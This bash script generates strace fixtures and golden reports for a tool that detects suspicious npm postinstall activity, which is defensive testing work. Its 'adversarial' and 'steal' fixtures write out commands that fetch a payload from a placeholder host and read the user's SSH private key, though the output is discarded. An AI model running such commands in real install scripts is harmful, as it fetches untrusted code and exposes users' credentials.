#!/bin/bash
set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$(dirname "$SCRIPT_DIR")")"
STRACE_VERSION_OUTPUT=$(strace --version | head -n1)

echo "Using $STRACE_VERSION_OUTPUT"

# Extract STRACE_FLAGS from JS
FLAGS=$(node -e 'import("'"$PROJECT_DIR/src/constants.js"'").then(m => console.log(m.STRACE_FLAGS.join(" ")))')

function generate_fixture() {
  local name=$1
  local script=$2
  
  echo "Generating $name.strace..."
  local temp_dir=$(mktemp -d)
  
  cd "$temp_dir"
  # Dummy setup so it acts real
  mkdir -p node_modules/$name/build
  echo '{"name":"'$name'"}' > package.json
  
  # Run strace
  strace $FLAGS -o "$SCRIPT_DIR/$name.strace" sh -c "$script" || true
  
  # Inject version header
  sed -i.bak "1i # Generated with $STRACE_VERSION_OUTPUT" "$SCRIPT_DIR/$name.strace" && rm -f "$SCRIPT_DIR/$name.strace.bak"
  
  # Generate full report (suppressing the default exit code on suspicious findings)
  node "$PROJECT_DIR/bin/trace-npm.js" report \
    --trace-file "$SCRIPT_DIR/$name.strace" \
    --package "$name" \
    --script "postinstall" \
    --fail-on "none" \
    --json > "$SCRIPT_DIR/$name.report.json"
    
  # Extract stable golden projection for drift detection
  cat "$SCRIPT_DIR/$name.report.json" | node -e '
    const r = JSON.parse(require("fs").readFileSync(0, "utf-8"));
    const proj = {
      unparsedLines: r.trace.unparsedLines,
      suspicious: r.suspicious.map(s => ({ label: s.label, path: s.path, access: s.access, syscall: s.syscall })),
      network: r.network.map(n => ({ endpoint: n.endpoint, syscall: n.syscall, status: n.status })),
      processes: r.processes.map(p => ({ command: p.command, status: p.status, failed: p.failed })),
      filesOutsideCwd: r.files
        .map(f => f.path)
        .filter(p => !p.startsWith(r.cwd))
        .filter(p => !p.startsWith("/usr/lib") && !p.startsWith("/lib") && !p.startsWith("/etc/ld.so"))
    };
    console.log(JSON.stringify(proj, null, 2));
  ' > "$SCRIPT_DIR/$name.golden.json"
  
  cd "$SCRIPT_DIR"
  rm -rf "$temp_dir"
}

# Benign script
generate_fixture "benign" "node -e \"console.log('Building safe package...')\"; touch node_modules/benign/build/output.node; cat package.json > /dev/null"

# Adversarial script
generate_fixture "adversarial" "curl -s https://example.invalid/payload > /dev/null; cat ~/.ssh/id_rsa > /dev/null 2>&1"

# Steal script (for D1 test)
generate_fixture "steal" "bash -c 'cat ~/.ssh/id_rsa > /dev/null 2>&1'"

echo "Done."
